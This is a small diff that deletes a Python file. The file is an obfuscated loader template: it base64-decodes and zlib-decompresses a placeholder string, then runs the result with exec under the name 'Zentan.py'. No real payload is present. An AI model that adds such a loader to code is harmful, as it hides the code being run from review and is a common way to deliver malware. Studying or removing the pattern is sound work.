@@ -1,7 +1,0 @@
-import base64
-import zlib
-
-data = "BASE64_КОД"
-code = zlib.decompress(base64.b64decode(data)).decode()
-exec(compile(code, "Zentan.py", "exec"))
-
